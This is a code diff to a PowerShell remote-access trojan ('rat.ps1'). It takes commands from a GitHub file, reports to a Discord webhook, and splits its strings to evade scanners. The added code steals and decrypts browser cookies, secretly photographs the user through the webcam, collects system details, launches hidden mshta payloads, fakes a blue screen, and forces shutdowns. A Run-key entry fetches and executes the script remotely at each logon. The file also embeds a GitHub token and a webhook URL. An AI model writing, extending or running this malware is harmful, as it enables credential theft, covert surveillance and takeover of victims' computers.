@@ -1,14 +1,13 @@
 # rat.ps1 — Discord C2 RAT agent
-# Polls a command file on GitHub raw, executes, reports to a Discord webhook.
-# Deployed by the comicstreams HTA (runs hidden, survives via registry Run key).
+# Polls a command file on GitHub API, executes, reports to a Discord webhook.
 
 # ---- Config (strings split to dodge static scanning) ----
 $C='https://api.github.com/repos/'+'kaikssaqes/'+'rat/'+'contents/'+'cmd.txt'
 $T='ghp_'+'GrrBo1wB58Al0gigScS1HnnjELP6mQ2aOyp5'
 $RA='https://raw.githubusercontent.com/'+'kaikssaqes/'+'rat/'+'main/'+'rat.ps1'
 $W='https://discord.com/api/webhooks/'+'1550915076586868767/'+'Z1NukXzFi0yUb1kjQdvWti7E_3PQGwHwoYcls0zbclywzZ9YL86NBWem8bVgI5BCSWdo'
-$S=Join-Path $env:TEMP 'r_s.tmp'     # last-executed command state
-$script:P=2000                       # poll interval (ms)
+$S=Join-Path $env:TEMP 'r_s.tmp'
+$script:P=2000
 
 # ---- HTTP helpers ----
 function Post($text){
@@ -43,6 +42,7 @@ function Upload-File($path){
   }catch{}
 }
 
+# ---- Screenshot ----
 function Shot(){
   try{
     Add-Type -AssemblyName System.Windows.Forms
@@ -59,6 +59,7 @@ function Shot(){
   }catch{}
 }
 
+# ---- Persist ----
 function Persist{
   try{
     $v="powershell -NoP -W Hidden -c IEX(New-Object Net.WebClient).DownloadString('$RA')"
@@ -67,6 +68,309 @@ function Persist{
   }catch{}
 }
 
+# ---- Shutdown ----
+function Shutdown-Machine{
+  try{
+    Post '`[+] shutting down now`'
+    Start-Sleep 1
+    shutdown /s /t 0
+  }catch{}
+}
+
+# ---- Wallpaper ----
+function Set-Wallpaper($url){
+  try{
+    $p=Join-Path $env:TEMP 'w.jpg'
+    (New-Object Net.WebClient).DownloadFile($url,$p)
+    Set-ItemProperty -Path 'HKCU:\Control Panel\Desktop' -Name Wallpaper -Value $p
+    Set-ItemProperty -Path 'HKCU:\Control Panel\Desktop' -Name WallpaperStyle -Value '10'
+    Set-ItemProperty -Path 'HKCU:\Control Panel\Desktop' -Name TileWallpaper -Value '0'
+    RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters 1, True
+    Post "`[+] wallpaper set: $url"
+  }catch{ Post '`[!] wallpaper failed' }
+}
+
+# ---- System recon ----
+function Get-Info{
+  try{
+    $os=Get-CimInstance Win32_OperatingSystem
+    $cs=Get-CimInstance Win32_ComputerSystem
+    $cpu=Get-CimInstance Win32_Processor
+    $gpu=Get-CimInstance Win32_VideoController
+    $bb=Get-CimInstance Win32_BaseBoard
+    $bios=Get-CimInstance Win32_BIOS
+    $ip=(Get-NetIPAddress -AddressFamily IPv4 -EA 0 | Where-Object {$_.IPAddress -notlike '127.*' -and $_.IPAddress -notlike '169.*'} | Select-Object -First 1).IPAddress
+    if(-not $ip){ $ip=(Get-CimInstance Win32_NetworkAdapterConfiguration -EA 0 | Where-Object {$_.IPAddress} | Select-Object -First 1).IPAddress[0] }
+    $up=((Get-Date)-$os.LastBootUpTime)
+    $upstr="{0}d {1}h {2}m" -f $up.Days,$up.Hours,$up.Minutes
+    $disks=Get-CimInstance Win32_LogicalDisk -Filter "DriveType=3"
+    $ramGB=[math]::Round($cs.TotalPhysicalMemory/1GB,1)
+    $ramFree=[math]::Round($os.FreePhysicalMemory/1MB,1)
+    $procs=Get-Process | Sort-Object CPU -Descending | Select-Object -First 25 | ForEach-Object { "{0,-6} {1,-32} CPU={2}s WS={3}MB" -f $_.Id,$_.ProcessName,[math]::Round($_.CPU,1),[math]::Round($_.WS/1MB,0) }
+    $soft=(Get-ItemProperty 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*','HKLM:\Software\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*' -EA 0 | Where-Object {$_.DisplayName} | Select-Object -ExpandProperty DisplayName -Unique | Sort-Object) -join ', '
+    $o=@()
+    $o+="HOSTNAME  : $($cs.Name)"
+    $o+="USERNAME  : $env:USERNAME"
+    $o+="DOMAIN    : $env:USERDOMAIN"
+    $o+="IP        : $ip"
+    $o+="OS        : $($os.Caption) ($($os.Version)) $($os.OSArchitecture)"
+    $o+="UPTIME    : $upstr"
+    $o+="CPU       : $($cpu.Name) ($($cpu.NumberOfCores)C/$($cpu.NumberOfLogicalProcessors)T)"
+    $o+="RAM       : $ramGB GB total / $ramFree GB free"
+    $o+="GPU       : $($gpu.Name) ($([math]::Round($gpu.AdapterRAM/1MB,0)) MB)"
+    $o+="BOARD     : $($bb.Manufacturer) $($bb.Product)"
+    $o+="BIOS      : $($bios.Manufacturer) $($bios.SMBIOSBIOSVersion)"
+    $o+="DISKS     :"
+    foreach($d in $disks){ $o+="  $($d.DeviceID) $([math]::Round($d.Size/1GB,1)) GB total / $([math]::Round($d.FreeSpace/1GB,1)) GB free" }
+    $o+="PROCS (top25):"
+    $o+=$procs
+    $o+="SOFTWARE  : $soft"
+    Post ($o -join "`n")
+  }catch{}
+}
+
+# ---- Cookies ----
+function Get-Cookies($browser){
+  try{
+    Add-Type -AssemblyName System.Security
+    $b=$browser.ToLower()
+    $bases=@{
+      'chrome'="$env:LOCALAPPDATA\Google\Chrome\User Data"
+      'edge'="$env:LOCALAPPDATA\Microsoft\Edge\User Data"
+      'brave'="$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data"
+      'opera'="$env:APPDATA\Opera Software\Opera Stable"
+      'firefox'="$env:APPDATA\Mozilla\Firefox\Profiles"
+    }
+    if(-not $bases[$b]){ Post "`[!] browser: chrome/firefox/edge/brave/opera"; return }
+    $cookies=@()
+    if($b -eq 'firefox'){
+      $prof=Get-ChildItem $bases[$b] -Directory -EA 0 | Where-Object { Test-Path (Join-Path $_.FullName 'cookies.sqlite') } | Select-Object -First 1
+      if(-not $prof){ Post '`[!] no firefox cookies found'; return }
+      $src=Join-Path $prof.FullName 'cookies.sqlite'
+      $dst=Join-Path $env:TEMP 'ff_cookies.sqlite'
+      Copy-Item $src $dst -Force -EA 0
+      $raw=[IO.File]::ReadAllText($dst,[Text.Encoding]::GetEncoding('ISO-8859-1'))
+      $re=[regex]'(?s)([a-zA-Z0-9\.\-]{3,120}\.[a-zA-Z]{2,12})\x00(.{1,90}?)\x00(.{1,512}?)\x00'
+      foreach($m in $re.Matches($raw)){
+        $host=$m.Groups[1].Value
+        $name=$m.Groups[2].Value
+        $val=$m.Groups[3].Value
+        if($host -match '\.' -and $name -match '^[a-zA-Z0-9_\-\.=]{1,90}$'){
+          $cookies += [pscustomobject]@{host=$host;name=$name;value=$val}
+        }
+      }
+    } else {
+      $base=$bases[$b]
+      $cand=@((Join-Path $base 'Default\Network\Cookies'),(Join-Path $base 'Default\Cookies'),(Join-Path $base 'Profile 1\Network\Cookies'))
+      $src=$cand | Where-Object { Test-Path $_ } | Select-Object -First 1
+      if(-not $src){ Post "`[!] no $b cookies found"; return }
+      $dst=Join-Path $env:TEMP 'ch_cookies.db'
+      Copy-Item $src $dst -Force -EA 0
+      $bytes=[IO.File]::ReadAllBytes($dst)
+      $raw=[Text.Encoding]::GetEncoding('ISO-8859-1').GetString($bytes)
+      $re=[regex]'(?s)([a-zA-Z0-9\.\-]{3,120}\.[a-zA-Z]{2,12})\x00(.{1,80}?)\x00\x00(.{1,60}?)\x00\x00\x00\x00\x00\x00\x00\x00.{0,6}(v1[01])(.{6,600}?)(?=\x00)'
+      foreach($m in $re.Matches($raw)){
+        $host=$m.Groups[1].Value
+        $name=$m.Groups[2].Value
+        $ver=$m.Groups[4].Value
+        $enc=[Text.Encoding]::GetEncoding('ISO-8859-1').GetBytes($m.Groups[5].Value)
+        $plain=''
+        try{
+          $plain=[Text.Encoding]::UTF8.GetString([Security.Cryptography.ProtectedData]::Unprotect($enc,$null,'CurrentUser'))
+        }catch{}
+        if($host -match '\.' -and $name -match '^[a-zA-Z0-9_\-\.=]{1,80}$' -and $plain){
+          $cookies += [pscustomobject]@{host=$host;name=$name;value=$plain}
+        }
+      }
+      Remove-Item $dst -Force -EA 0
+    }
+    if($cookies.Count -eq 0){ Post "`[!] no cookies extracted from $b"; return }
+    $json=$cookies | ConvertTo-Json -Compress
+    $b64=[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($json))
+    $hdr="`[COOKIES] $b ($($cookies.Count))`n"
+    Post ($hdr + $b64)
+  }catch{ Post '`[!] cookie extraction failed' }
+}
+
+# ---- MSHTA ----
+function Run-Mshta($payload){
+  try{
+    if($payload -match '^https?://'){ Start-Process mshta.exe -ArgumentList $payload -WindowStyle Hidden }
+    else{
+      $p=Join-Path $env:TEMP 'm.hta'
+      Set-Content -Path $p -Value $payload -Force
+      Start-Process mshta.exe -ArgumentList $p -WindowStyle Hidden
+    }
+    Post "`[+] mshta launched: $payload"
+  }catch{ Post '`[!] mshta failed' }
+}
+
+# ---- Self destruct ----
+function Self-Destruct{
+  try{
+    Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'OneDriveSync' -EA 0
+    Remove-Item $S -Force -EA 0
+    Remove-Item (Join-Path $env:TEMP 'rat.ps1') -Force -EA 0
+    Remove-Item (Join-Path $env:TEMP 'r_s.tmp') -Force -EA 0
+    Post '`[+] self destructed`'
+    exit
+  }catch{ exit }
+}
+
+# ---- Webcam ----
+function Take-Webcam($idx){
+  try{
+    $idx=[int]$idx
+    if($idx -lt 0){$idx=0}
+    $cs=@'
+using System;
+using System.Runtime.InteropServices;
+using System.Runtime.InteropServices.ComTypes;
+using System.Drawing;
+using System.Drawing.Imaging;
+
+public class CamGrab {
+  [DllImport("ole32.dll")] static extern int CoInitialize(IntPtr pv);
+  [DllImport("ole32.dll")] static extern void CoUninitialize();
+  [DllImport("oleaut32.dll", PreserveSig=false)] static extern void GetRunningObjectTable(int r, out IRunningObjectTable rot);
+
+  static Guid CLSID_SystemDeviceEnum = new Guid("62BE5D10-60EB-11d0-BD3B-00A0C911CE86");
+  static Guid CLSID_VideoInputDeviceCategory = new Guid("860BB310-5D01-11d0-BD3B-00A0C911CE86");
+  static Guid IID_ICreateDevEnum = new Guid("29840822-5B84-11D0-BD3B-00A0C911CE86");
+  static Guid IID_IBaseFilter = new Guid("56a86895-0ad4-11ce-b03a-0020af0ba770");
+  static Guid IID_ISampleGrabber = new Guid("6B652FFF-11FE-4fce-92AD-0266B5D7C78F");
+  static Guid IID_IMediaControl = new Guid("56a868b1-0ad4-11ce-b03a-0020af0ba770");
+  static Guid CLSID_SampleGrabber = new Guid("C1F400A0-3F08-11d3-9F0A-006008039E37");
+  static Guid CLSID_NullRenderer = new Guid("C1F400A4-3F08-11d3-9F0A-006008039E37");
+  static Guid CLSID_FilterGraph = new Guid("E436EBB3-524F-11CE-9F53-0020AF0BA7B0");
+  static Guid IID_IGraphBuilder = new Guid("56a868a9-0ad4-11ce-b03a-0020af0ba770");
+  static Guid CLSID_CaptureGraphBuilder2 = new Guid("BF87B6E1-8C27-11d0-B3F0-00AA003761C5");
+  static Guid IID_ICaptureGraphBuilder2 = new Guid("93E5A4E0-2D50-11d2-AFA5-00A0C9C71E8CC");
+
+  [ComImport, Guid("29840822-5B84-11D0-BD3B-00A0C911CE86"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
+  interface ICreateDevEnum {
+    [PreserveSig] int CreateClassEnumerator([In] ref Guid pType, [Out] out IEnumMoniker ppEnum, [In] int dwFlags);
+  }
+  [ComImport, Guid("56a868a9-0ad4-11ce-b03a-0020af0ba770"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
+  interface IGraphBuilder {
+    [PreserveSig] int AddFilter([In, MarshalAs(UnmanagedType.Interface)] object pFilter, [In, MarshalAs(UnmanagedType.LPWStr)] string pName);
+    [PreserveSig] int QueryInterface([In] ref Guid riid, [Out] out IntPtr ppv);
+  }
+  [ComImport, Guid("93E5A4E0-2D50-11d2-AFA5-00A0C9C71E8C"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
+  interface ICaptureGraphBuilder2 {
+    [PreserveSig] int SetFiltergraph([In, MarshalAs(UnmanagedType.Interface)] object pfg);
+    [PreserveSig] int RenderStream([In] ref Guid pCategory, [In] ref Guid pType, [In, MarshalAs(UnmanagedType.Interface)] object pSource, [In, MarshalAs(UnmanagedType.Interface)] object pCompressor, [In, MarshalAs(UnmanagedType.Interface)] object pRenderer);
+  }
+  [ComImport, Guid("56a86895-0ad4-11ce-b03a-0020af0ba770"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
+  interface IBaseFilter {
+    [PreserveSig] int QueryInterface([In] ref Guid riid, [Out] out IntPtr ppv);
+  }
+  [ComImport, Guid("6B652FFF-11FE-4fce-92AD-0266B5D7C78F"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
+  interface ISampleGrabber {
+    [PreserveSig] int SetOneShot([In, MarshalAs(UnmanagedType.Bool)] bool oneShot);
+    [PreserveSig] int SetBufferSamples([In, MarshalAs(UnmanagedType.Bool)] bool buffer);
+    [PreserveSig] int GetCurrentBuffer(ref int pSize, IntPtr pBuffer);
+    [PreserveSig] int GetConnectedMediaType(IntPtr ppType);
+  }
+  [ComImport, Guid("56a868b1-0ad4-11ce-b03a-0020af0ba770"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
+  interface IMediaControl {
+    [PreserveSig] int Run();
+    [PreserveSig] int Stop();
+  }
+
+  public static string Snap(int index, string outPath) {
+    CoInitialize(IntPtr.Zero);
+    try {
+      object devEnumObj = Activator.CreateInstance(Type.GetTypeFromCLSID(CLSID_SystemDeviceEnum));
+      ICreateDevEnum devEnum = (ICreateDevEnum)devEnumObj;
+      IEnumMoniker enumMoniker;
+      devEnum.CreateClassEnumerator(ref CLSID_VideoInputDeviceCategory, out enumMoniker, 0);
+      if (enumMoniker == null) return "no cameras";
+      IMoniker[] monikers = new IMoniker[1];
+      var list = new System.Collections.Generic.List<IMoniker>();
+      while (enumMoniker.Next(1, monikers, IntPtr.Zero) == 0) { list.Add(monikers[0]); }
+      if (list.Count == 0) return "no cameras";
+      if (index >= list.Count) index = 0;
+      object filterObj;
+      list[index].BindToObject(null, null, ref IID_IBaseFilter, out filterObj);
+
+      object graphObj = Activator.CreateInstance(Type.GetTypeFromCLSID(CLSID_FilterGraph));
+      IGraphBuilder graph = (IGraphBuilder)graphObj;
+      graph.AddFilter(filterObj, "Capture");
+      object grabObj = Activator.CreateInstance(Type.GetTypeFromCLSID(CLSID_SampleGrabber));
+      ISampleGrabber grab = (ISampleGrabber)grabObj;
+      graph.AddFilter(grabObj, "Grabber");
+      object nullObj = Activator.CreateInstance(Type.GetTypeFromCLSID(CLSID_NullRenderer));
+      graph.AddFilter(nullObj, "Null");
+      object cgbObj = Activator.CreateInstance(Type.GetTypeFromCLSID(CLSID_CaptureGraphBuilder2));
+      ICaptureGraphBuilder2 cgb = (ICaptureGraphBuilder2)cgbObj;
+      cgb.SetFiltergraph(graphObj);
+      Guid MEDIATYPE_Video = new Guid("73646976-0000-0010-8000-00AA00389B71");
+      Guid PIN_CATEGORY_CAPTURE = new Guid("fb6c4281-0353-11d1-905f-0000c0cc16ba");
+      cgb.RenderStream(ref PIN_CATEGORY_CAPTURE, ref MEDIATYPE_Video, filterObj, null, grabObj);
+
+      IMediaControl mc = (IMediaControl)graphObj;
+      mc.Run();
+      System.Threading.Thread.Sleep(1500);
+      int size = 0;
+      grab.GetCurrentBuffer(ref size, IntPtr.Zero);
+      if (size <= 0) return "no frame";
+      IntPtr buf = Marshal.AllocHGlobal(size);
+      grab.GetCurrentBuffer(ref size, buf);
+      Bitmap bmp = new Bitmap(640, 480, PixelFormat.Format24bppRgb);
+      System.Drawing.Imaging.BitmapData bd = bmp.LockBits(new Rectangle(0,0,640,480), ImageLockMode.WriteOnly, PixelFormat.Format24bppRgb);
+      byte[] data = new byte[size];
+      Marshal.Copy(buf, data, 0, size);
+      Marshal.Copy(data, 0, bd.Scan0, Math.Min(data.Length, 640*480*3));
+      bmp.UnlockBits(bd);
+      bmp.Save(outPath, ImageFormat.Png);
+      bmp.Dispose();
+      Marshal.FreeHGlobal(buf);
+      mc.Stop();
+      return "ok";
+    } catch (Exception e) { return "err: " + e.Message; }
+    finally { CoUninitialize(); }
+  }
+}
+'@
+    Add-Type -TypeDefinition $cs -ReferencedAssemblies System.Drawing
+    $p=Join-Path $env:TEMP ('cam_'+[Guid]::NewGuid().ToString('N')+'.png')
+    $res=[CamGrab]::Snap($idx,$p)
+    if($res -eq 'ok' -and (Test-Path $p)){ Upload-File $p; Post "`[+] webcam shot (cam $idx)" }
+    else { Post "`[!] webcam: $res" }
+    Remove-Item $p -Force -EA 0
+  }catch{ Post '`[!] webcam failed' }
+}
+
+# ---- Blue screen ----
+function Show-BlueScreen{
+  try{
+    $inner=@'
+Add-Type -AssemblyName System.Windows.Forms
+Add-Type -AssemblyName System.Drawing
+$f=New-Object Windows.Forms.Form
+$f.FormBorderStyle='None'
+$f.WindowState='Maximized'
+$f.TopMost=$true
+$f.BackColor=[Drawing.Color]::FromArgb(0,120,215)
+$f.ControlBox=$false
+$lbl=New-Object Windows.Forms.Label
+$lbl.Text=":(`r`nYour PC ran into a problem and needs to restart. We're just collecting some error info, and then we'll restart for you.`r`n`r`nStop code: CRITICAL_PROCESS_DIED"
+$lbl.ForeColor=[Drawing.Color]::White
+$lbl.Font=New-Object Drawing.Font('Segoe UI',20)
+$lbl.Dock='Fill'
+$lbl.TextAlign='MiddleLeft'
+$lbl.Padding=New-Object Windows.Forms.Padding(80)
+$f.Controls.Add($lbl)
+$f.ShowDialog()
+'@
+    $enc=[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($inner))
+    Start-Process powershell.exe -ArgumentList '-NoP','-W','Hidden','-EncodedCommand',$enc -WindowStyle Hidden
+    Post '`[+] blue screen shown (clears on restart)`'
+  }catch{}
+}
+
+# ---- Command dispatcher ----
 function Run-Cmd($c){
   try{
     if($c -eq 'proclist'){
@@ -92,8 +396,18 @@ function Run-Cmd($c){
         else{ $d=[Convert]::ToBase64String([IO.File]::ReadAllBytes($p)); Post "`[FILE] $p`n``````$d``````" }
       } else { Post "`[!] not found: $p" }
     }
-    elseif($c -eq 'screenshot'){ Shot }
+    elseif($c -eq 'screenshot' -or $c -eq 'screen'){ Shot }
     elseif($c -eq 'persist'){ Persist }
+    elseif($c -eq 'shutdown'){ Shutdown-Machine }
+    elseif($c -like 'wallpaper:*'){ Set-Wallpaper ($c.Substring(10)) }
+    elseif($c -eq 'info'){ Get-Info }
+    elseif($c -like 'cookies:*'){ Get-Cookies ($c.Substring(8)) }
+    elseif($c -eq 'cookies'){ Get-Cookies 'chrome' }
+    elseif($c -like 'mshta:*'){ Run-Mshta ($c.Substring(6)) }
+    elseif($c -eq 'selfdestruct'){ Self-Destruct }
+    elseif($c -eq 'webcam'){ Take-Webcam 0 }
+    elseif($c -like 'webcam:*'){ Take-Webcam ($c.Substring(7)) }
+    elseif($c -eq 'bluescreen'){ Show-BlueScreen }
     elseif($c -like 'sleep:*'){
       $script:P=[int]$c.Substring(6)
       Post "`[+] poll set to $($script:P) ms"
@@ -121,7 +435,7 @@ while($true){
     $remote=$wc.DownloadString($C).Trim()
     $wc.Dispose()
     $i=$remote.IndexOf('|')
-    if($i -ge 0){ $cmd=$remote.Substring(0,$i).Trim(); $nonce=$remote.Substring($i+1) }
+    if($i -ge 0){ $cmd=$remote.Substring(0,$i).Trim(); $nonce=$remote.Substring($i+1).Trim() }
     else{ $cmd=$remote; $nonce=$remote }
     $last=[string](Get-Content $S -Raw -EA SilentlyContinue)
     $last=$last.Trim()
